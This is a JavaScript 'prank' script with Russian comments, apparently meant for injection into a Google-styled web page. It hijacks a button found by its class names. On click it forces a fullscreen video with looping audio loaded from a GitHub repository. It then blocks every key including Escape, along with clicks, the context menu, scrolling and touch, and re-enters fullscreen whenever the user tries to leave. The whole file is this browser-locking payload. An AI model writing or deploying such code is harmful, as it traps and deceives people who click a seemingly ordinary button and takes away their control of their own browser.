(function() {
    // Абсолютные пути к файлам из вашего репозитория
    const VIDEO_URL = 'https://github.com/thisisban/thisisban.github.io/raw/refs/heads/main/src/video.mp4';
    const AUDIO_URL = 'https://github.com/thisisban/thisisban.github.io/raw/refs/heads/main/src/audio.mp3';
    
    console.log('Video URL:', VIDEO_URL);
    console.log('Audio URL:', AUDIO_URL);
    
    // Удаляем все старые медиа-элементы и скрипты с путями к prank.mp3/prank.mp4
    function cleanupOldMedia() {
        // Удаляем все аудио и видео элементы с путями к prank.mp3/prank.mp4
        const mediaElements = document.querySelectorAll('audio, video, source');
        mediaElements.forEach(el => {
            if (el.src && (el.src.includes('prank.mp3') || el.src.includes('prank.mp4'))) {
                el.remove();
                console.log('Removed old media element:', el.src);
            }
        });
        
        // Удаляем все скрипты с путями к prank.mp3/prank.mp4
        const scripts = document.querySelectorAll('script[src*="prank"]');
        scripts.forEach(script => {
            if (script.src.includes('prank')) {
                script.remove();
                console.log('Removed old script:', script.src);
            }
        });
        
        // Удаляем старый контейнер если есть
        const oldContainer = document.getElementById('prankContainer');
        if (oldContainer) {
            oldContainer.remove();
            console.log('Removed old container');
        }
        
        // Удаляем старые стили если есть
        const oldStyles = document.querySelectorAll('style[data-prank]');
        oldStyles.forEach(style => style.remove());
    }
    
    // Вызываем очистку
    cleanupOldMedia();
    
    // Создаем полноэкранный контейнер
    const container = document.createElement('div');
    container.id = 'prankContainer';
    container.setAttribute('data-prank', 'true');
    
    // Создаем стили для контейнера
    const containerStyles = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        display: none;
        background: black;
        z-index: 999999;
        pointer-events: none;
    `;
    container.style.cssText = containerStyles;
    
    // Создаем видео элемент
    const video = document.createElement('video');
    video.id = 'prankVideo';
    video.setAttribute('data-prank', 'true');
    
    const videoStyles = `
        width: 100%;
        height: 100%;
        object-fit: cover;
        pointer-events: none;
    `;
    video.style.cssText = videoStyles;
    video.playsInline = true;
    video.webkitPlaysInline = true;
    video.muted = false; // Пробуем сразу без mute
    
    // Создаем source для видео с абсолютным путем
    const videoSource = document.createElement('source');
    videoSource.src = VIDEO_URL;
    videoSource.type = 'video/mp4';
    video.appendChild(videoSource);
    
    // Создаем аудио элемент
    const audio = document.createElement('audio');
    audio.id = 'prankAudio';
    audio.setAttribute('data-prank', 'true');
    
    const audioStyles = `
        display: none;
        pointer-events: none;
    `;
    audio.style.cssText = audioStyles;
    audio.loop = true;
    audio.muted = false;
    
    // Создаем source для аудио с абсолютным путем
    const audioSource = document.createElement('source');
    audioSource.src = AUDIO_URL;
    audioSource.type = 'audio/mpeg';
    audio.appendChild(audioSource);
    
    container.appendChild(video);
    container.appendChild(audio);
    document.body.appendChild(container);
    
    // Функция для входа в полноэкранный режим
    function requestFullscreen(element) {
        if (element.requestFullscreen) {
            return element.requestFullscreen();
        } else if (element.webkitRequestFullscreen) {
            return element.webkitRequestFullscreen();
        } else if (element.mozRequestFullScreen) {
            return element.mozRequestFullScreen();
        } else if (element.msRequestFullscreen) {
            return element.msRequestFullscreen();
        }
        return Promise.reject('Fullscreen not supported');
    }
    
    // Блокируем все способы выхода
    function blockEscapeAndControls() {
        // Блокируем клавиши (особенно ESC)
        const blockKey = function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        };
        
        // Блокируем контекстное меню
        const blockContext = function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            return false;
        };
        
        // Добавляем обработчики с захватом
        ['keydown', 'keyup', 'keypress'].forEach(event => {
            document.addEventListener(event, blockKey, {capture: true, passive: false});
        });
        
        document.addEventListener('contextmenu', blockContext, {capture: true, passive: false});
        document.addEventListener('click', blockContext, {capture: true, passive: false});
        document.addEventListener('touchstart', blockContext, {capture: true, passive: false});
        document.addEventListener('wheel', blockContext, {capture: true, passive: false});
        
        // Мониторим выход из полноэкранного режима и сразу возвращаемся
        const returnToFullscreen = function() {
            if (!document.fullscreenElement && 
                !document.webkitFullscreenElement && 
                !document.mozFullScreenElement) {
                console.log('Trying to exit fullscreen, blocking...');
                requestFullscreen(container);
            }
        };
        
        document.addEventListener('fullscreenchange', returnToFullscreen, {capture: true});
        document.addEventListener('webkitfullscreenchange', returnToFullscreen, {capture: true});
        document.addEventListener('mozfullscreenchange', returnToFullscreen, {capture: true});
    }
    
    // Находим кнопку по уникальным классам
    const button = document.querySelector('.VfPpkd-LgbsSe.VfPpkd-LgbsSe-OWXEXe-k8QpJ.VfPpkd-LgbsSe-OWXEXe-dgl2Hf.nCP5yc.AjY5Oe.DuMIQc.LQeN7.MjT6xe.sOCCfd.brKGGd.BhQfub.zwjsl');
    
    if (button) {
        button.addEventListener('click', async function(e) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            
            console.log('Button clicked, starting prank...');
            
            // Меняем текст кнопки
            const span = button.querySelector('.VfPpkd-vQzf8d');
            if (span) span.textContent = 'Загрузка...';
            
            try {
                // Показываем контейнер ДО полноэкранного режима
                container.style.display = 'block';
                
                // Блокируем управление
                blockEscapeAndControls();
                
                // Пытаемся войти в полноэкранный режим
                await requestFullscreen(container);
                console.log('Fullscreen activated');
                
                // Скрываем кнопку
                button.style.display = 'none';
                
                // Пробуем запустить видео сразу
                try {
                    await video.play();
                    console.log('Video started successfully');
                } catch (videoErr) {
                    console.log('Video autoplay blocked, trying muted:', videoErr);
                    video.muted = true;
                    await video.play();
                    
                    // Через 1 секунду пробуем включить звук
                    setTimeout(() => {
                        video.muted = false;
                    }, 1000);
                }
                
                // Пробуем запустить аудио
                setTimeout(() => {
                    audio.play().then(() => {
                        console.log('Audio started successfully');
                    }).catch(audioErr => {
                        console.log('Audio blocked, retrying:', audioErr);
                        // Пробуем еще раз через взаимодействие
                        setTimeout(() => audio.play(), 500);
                    });
                }, 500);
                
                // Автоперезапуск видео
                video.addEventListener('ended', () => {
                    video.currentTime = 0;
                    video.play();
                });
                
            } catch (fullscreenErr) {
                console.log('Fullscreen failed, fallback:', fullscreenErr);
                
                // Fallback без полноэкранного режима
                button.style.display = 'none';
                container.style.display = 'block';
                
                // Запускаем видео
                video.play().catch(vErr => {
                    console.log('Video play error in fallback:', vErr);
                    video.muted = true;
                    video.play();
                });
                
                // Запускаем аудио
                setTimeout(() => {
                    audio.play().catch(aErr => console.log('Audio error in fallback:', aErr));
                }, 500);
            }
        });
    }
    
    // Добавляем стили для отключения контролов видео
    const style = document.createElement('style');
    style.setAttribute('data-prank', 'true');
    style.textContent = `
        html, body {
            overflow: hidden !important;
            height: 100% !important;
            margin: 0 !important;
            padding: 0 !important;
        }
        
        #prankContainer video::-webkit-media-controls {
            display: none !important;
        }
        
        #prankContainer video::-webkit-media-controls-enclosure {
            display: none !important;
        }
        
        #prankContainer video::-webkit-media-controls-panel {
            display: none !important;
        }
        
        #prankContainer video::-webkit-media-controls-play-button {
            display: none !important;
        }
        
        #prankContainer video::-webkit-media-controls-start-playback-button {
            display: none !important;
        }
    `;
    document.head.appendChild(style);
    
    console.log('Prank script loaded successfully');
})();
